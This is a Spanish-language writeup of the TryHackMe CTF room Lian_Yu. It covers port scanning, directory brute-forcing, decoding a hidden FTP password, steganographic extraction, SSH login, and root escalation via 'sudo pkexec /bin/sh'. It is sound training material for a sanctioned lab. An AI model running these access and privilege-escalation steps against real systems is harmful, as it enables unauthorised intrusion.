---
title: TryHackMe Lian_Yu Writeup
published: true
---

La máquina Lian_Yu, es una máquina de TryHackMe en la que mediante el seguimiento de la room en TryHackMe conseguiremos resolver una serie de preguntas que nos plantean:

* ¿Cuál es el directorio web encontrado?<br>
    ****
* ¿Cuál es el nombre del archivo que encunetras?<br>
    **********.*****
* ¿Cuál es la contraseña de FTP?<br>
    *********
* ¿Cuál es el nombre del archivo que tiene la contraseña de SSH?<br>
    *****
* ¿user.txt?<br>
    ????????????????????????
* ¿root.txt?<br>
    ????????????????????????


# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar las seis primeras preguntas: 

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 13:48 EDT
Initiating SYN Stealth Scan at 13:48
Scanning 10.10.231.51 [65535 ports]
Discovered open port 111/tcp on 10.10.231.51
Discovered open port 22/tcp on 10.10.231.51
Discovered open port 21/tcp on 10.10.231.51
Discovered open port 80/tcp on 10.10.231.51
Discovered open port 55237/tcp on 10.10.231.51
Completed SYN Stealth Scan at 13:49, 12.05s elapsed (65535 total ports)
Nmap scan report for 10.10.231.51
Host is up, received user-set (0.048s latency).
Scanned at 2022-10-31 13:48:54 EDT for 12s
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE REASON
21/tcp    open  ftp     syn-ack ttl 63
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
55237/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds
           Raw packets sent: 66006 (2.904MB) | Rcvd: 66339 (2.731MB)

```
 
Con el puerto 80 abierto, introducimos la dirección IP en el buscador y nos reporta una pequeña explicación sobre la máquina, pero nada más. Puesto que en la primera pregunta nos pregunta por directorio oculto vamos a tratar de analizarlos con gobuster:

```bash
❯ gobuster dir -u http://10.10.231.51 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.231.51
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/31 13:56:13 Starting gobuster in directory enumeration mode
===============================================================
/island               (Status: 301) [Size: 235] [--> http://10.10.231.51/island/]
```
Conseguimos un directorio en el que si inspeccionamos la página desde nuestro buscador nos reporta un potencial usuario o contraseña en el código fuente:

> "<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>"

Tratamos de seguir buscando directorios desde /island porque el que nos piden no nos lo ha registrado. 

```bash
❯ gobuster dir -u http://10.10.231.51/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.231.51/island
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/31 13:59:30 Starting gobuster in directory enumeration mode
===============================================================
/2100                 (Status: 301) [Size: 240] [--> http://10.10.231.51/island/2100/]
Progress: 33865 / 220561 (15.35%)                                                    ^C
[!] Keyboard interrupt detected, terminating.
                                                                                      
===============================================================
2022/10/31 14:00:31 Finished
===============================================================
```

Encontramos /island/2100 (1ª pregunta) y en el código fuente podemos observar un comentario en el que se menciona .ticket

Podría ser una extensión de un archivo y en la siguiente pregunta nos solicitan el nombre de un archivo por lo que con gobuster volvemos a analizar directorios ocultos (en este punto añadimos la extensión de archivo .ticket):

```bash
❯ gobuster dir -u http://10.10.231.51/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25 -x ticket
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.231.51/island/2100
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              ticket
[+] Timeout:                 10s
===============================================================
2022/10/31 14:07:05 Starting gobuster in directory enumeration mode
===============================================================
/green_arrow.ticket   (Status: 200) [Size: 71]
Progress: 39000 / 441122 (8.84%)             ^C
[!] Keyboard interrupt detected, terminating.
                                              
===============================================================
2022/10/31 14:08:13 Finished
===============================================================
```

Nos reporta la respuesta a la siguiente pregunta y al dirigirnos a este se muestra lo siguiente:

> This is just a token to get into Queen's Gambit(Ship)
>
> RTy8yhBQdscX

Tras un tiempo intentando descodificarlo, lo consigo con base 58

> !#th3h00d

Teniendo en cuenta que esta es la contraseña FTP que nos piden, intentamos conectarnos por este medio con el name vigilante (conseguido anteriormente) y la contraseña que acabamos de conseguir

Vemos tres archivos, nos los llevaremos a nuestro equipo con

> get Leave_me_alone.png
> get Queen's_Gambit.png
> get aa.jpg


```bash
❯ ftp 10.10.231.51
Connected to 10.10.231.51.
220 (vsFTPd 3.0.2)
Name (10.10.231.51:jorge): vigilante
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||57120|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
```

Al hacer un file sobre Leave_me_alone nos muestra que es una imagen PNG. Sin embargo, al editarla con hexeditor me doy cuenta que los primeros dígitos no corresponden con el innicio de una imagen típica PNG. Cambio los primeros dígitos hexadecimales para que se traduzca en .PNG:

> 89 50 4E 47  0D 0A 1A 0A 

Al abrir la imagen nos reporta una contraseña

Puesto que tenemos dos archivos de imagen más, intendo extraer un posible contenido de estas mediante steghide:

> steghide extract -sf Queen's_Gambit.png

Parece que la contraseña no es la correcta, lo intantaré con la otra imagen:

> steghide extract -sf aa.jpg

Anoto la contraseña y nos reporta un archivo .zip

Lo extreamos con 7z:

> 7z x ss.zip

```bash
❯ 7z x ss.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs 11th Gen Intel(R) Core(TM) i5-11400F @ 2.60GHz (A0671),ASM,AES-NI)

Scanning the drive for archives:
1 file, 596 bytes (1 KiB)

Extracting archive: ss.zip
--
Path = ss.zip
Type = zip
Physical Size = 596

Everything is Ok

Files: 2
Size:       343
Compressed: 596
```

Uno de los archivos no nos da información relevante pero el otro nos vuelve a reportar una potencial contraseña.

# [](#header-1)Acceso al sistema 

En la room de TryHackMe nos preguntan por el nombre del archivo que contiene la contraseña para conectarse mediante SSH. Ponemos el nombre del archivo que acabamos de abrir y es correcto. Nos da la información de que podemos conectarnos mediante SSH.

Intento conectarme mediante SSH a la IP-VICTIMA como el usuario vigilante pero no me deja. Volviendo al servicio ftp veo que si me dirijo a /home hay otro usuario:

```bash
ftp> pwd
Remote directory: /home/vigilante
ftp> cd /home
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||42161|).
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 May 01  2020 slade
drwxr-xr-x    2 1001     1001         4096 May 05  2020 vigilante
226 Directory send OK.
ftp> 
```
Intentaremos conectarnos por SSH con este usuario:

```bash
❯ ssh slade@10.10.207.227
The authenticity of host '10.10.207.227 (10.10.207.227)' can't be established.
ED25519 key fingerprint is SHA256:DOqn9NupTPWQ92bfgsqdadDEGbQVHMyMiBUDa0bKsOM.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:19: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.207.227' (ED25519) to the list of known hosts.
slade@10.10.207.227's password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$ pwd
/home/slade
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt
THM{?????????????????????????}
                        --Felicity Smoak

slade@LianYu:~$ 
```

Lo conseguimso y obtenemos la flag del usuario!

# [](#header-1)Escalada de privilegios

Hacemos sudo -l para ver que comandos podemos ejecutar como root y nos reporta lo siguiente:

```bash
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

NOs dirigimos a <a href="https://gtfobins.github.io/gtfobins/pkexec/" >GTFOBins</a> y vemos que podemos escalar privilegios con una simple línea de código:

> sudo pkexec /bin/sh

Lo ejecutamos y conseguimos la flag de root!

```bash
slade@LianYu:~$     sudo pkexec /bin/sh
# whoami
whoami: not found
# ls
root.txt
# cat root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{??????????????????????????????????????????????????????????????????????????????????????}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825

```

Muchas gracias por leer este writeup, espero que te haya gustado!
